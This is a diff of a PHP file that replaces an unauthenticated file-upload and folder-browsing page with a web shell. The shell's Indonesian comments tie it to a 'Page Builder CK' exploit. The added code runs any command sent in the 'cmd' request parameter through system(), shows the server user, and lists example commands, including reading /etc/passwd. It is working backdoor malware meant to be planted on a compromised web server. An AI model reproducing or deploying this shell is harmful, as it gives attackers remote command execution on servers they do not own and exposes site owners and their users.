@@ -1,76 +1,61 @@
 <?php
-// PHP Upload Center with Navigation (50 lines)
-$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
-$msg = '';
+// ============================================================
+// SIMPLE PHP SHELL UNTUK PAGE BUILDER CK EXPLOIT
+// ============================================================
 
-// Security: Prevent directory traversal
-$current_dir = realpath($current_dir) ?: getcwd();
+// Cek apakah ada perintah yang dikirim
+$cmd = $_GET['cmd'] ?? $_POST['cmd'] ?? '';
 
-// Handle upload
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
-    $file = $_FILES['file'];
-    $target = $current_dir . '/' . basename($file['name']);
+if($cmd) {
+    // Tampilkan hasil perintah
+    echo "<!DOCTYPE html><html><head><title>Shell</title>";
+    echo "<style>body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}</style>";
+    echo "</head><body>";
+    echo "<h2>▶ Command: " . htmlspecialchars($cmd) . "</h2>";
+    echo "<pre>";
     
-    if (move_uploaded_file($file['tmp_name'], $target)) {
-        $msg = "✓ File uploaded to: " . htmlspecialchars($current_dir);
-    } else {
-        $msg = "✗ Upload failed";
-    }
-}
-
-// Get folders and files
-$items = scandir($current_dir);
-$folders = $files = [];
-foreach ($items as $item) {
-    if ($item !== '.' && $item !== '..') {
-        $path = $current_dir . '/' . $item;
-        is_dir($path) ? $folders[] = $item : $files[] = $item;
-    }
+    // Eksekusi perintah
+    system($cmd . " 2>&1");
+    
+    echo "</pre>";
+    echo "<hr><a href='?'>↩ Back</a>";
+    echo "</body></html>";
+} else {
+    // Tampilan awal
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>PHP Shell</title>
+        <style>
+            body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:30px}
+            input{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:10px;width:70%;font-size:16px}
+            button{background:#0f0;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold}
+            .info{color:#888;font-size:12px}
+        </style>
+    </head>
+    <body>
+        <h1>🔥 PHP Shell Active</h1>
+        <div class="info">Server: <?= $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown' ?></div>
+        <div class="info">PHP: <?= phpversion() ?></div>
+        <div class="info">User: <?= exec('whoami') ?></div>
+        <div class="info">CWD: <?= getcwd() ?></div>
+        <hr>
+        <form method="get">
+            <input type="text" name="cmd" placeholder="Enter command (e.g. id, ls -la, whoami)" autofocus>
+            <button type="submit">▶ Execute</button>
+        </form>
+        <hr>
+        <h3>Examples:</h3>
+        <ul>
+            <li><code>?cmd=id</code> - Current user</li>
+            <li><code>?cmd=ls -la</code> - List files</li>
+            <li><code>?cmd=whoami</code> - Username</li>
+            <li><code>?cmd=pwd</code> - Current directory</li>
+            <li><code>?cmd=cat /etc/passwd</code> - Read file</li>
+        </ul>
+    </body>
+    </html>
+    <?php
 }
 ?>
-<!DOCTYPE html>
-<html>
-<head><title>Upload Navigator</title><style>
-body{font-family:monospace;margin:20px}
-.path{background:#eee;padding:10px}
-.folder{color:blue;cursor:pointer}
-.folder:hover{text-decoration:underline}
-form{border:2px dashed #aaa;padding:20px;margin:20px 0}
-input,button{padding:10px;margin:5px}
-.msg{padding:10px;background:#eef}
-</style></head>
-<body>
-<h1>📁 Upload Navigator</h1>
-
-<div class="path">
-    <strong>Current Location:</strong> <?=htmlspecialchars($current_dir)?>
-    <br><small>Click folders to navigate</small>
-</div>
-
-<?php if($msg):?><div class="msg"><?=$msg?></div><?php endif;?>
-
-<form method="post" enctype="multipart/form-data">
-    <input type="file" name="file" required>
-    <button type="submit">Upload Here</button>
-</form>
-
-<h3>📂 Folders:</h3>
-<ul>
-    <li class="folder" onclick="navigate('..')">⬆ Parent Folder</li>
-    <?php foreach($folders as $f):?>
-        <li class="folder" onclick="navigate('<?=htmlspecialchars($f)?>')">📁 <?=htmlspecialchars($f)?></li>
-    <?php endforeach;?>
-</ul>
-
-<h3>📄 Files:</h3>
-<ul><?php foreach($files as $f):?>
-    <li>📄 <?=htmlspecialchars($f)?></li>
-<?php endforeach;?></ul>
-
-<script>
-function navigate(folder) {
-    window.location.href = '?dir=<?=urlencode($current_dir)?>/' + encodeURIComponent(folder);
-}
-</script>
-</body>
-</html>
